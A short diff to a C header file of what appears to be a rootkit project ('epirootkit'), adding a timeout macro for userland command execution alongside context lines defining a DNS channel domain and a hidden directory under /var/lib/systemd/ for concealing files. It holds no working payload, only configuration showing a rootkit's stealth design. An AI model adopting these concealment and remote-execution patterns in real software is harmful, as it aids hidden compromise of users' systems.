@@ -53,6 +53,9 @@ enum Protocol {
 #define DNS_SERVER_IP SERVER_IP
 #define DNS_DOMAIN "dns.google.com"
 
+// USERLAND COMMAND EXECUTION MACROS
+#define USERLAND_CMD_TIMEOUT 5
+
 // HIDDEN FILES MACROS
 #define HIDDEN_DIR_NAME ".epirootkit-hidden-fs"
 #define HIDDEN_DIR_PATH "/var/lib/systemd/" HIDDEN_DIR_NAME
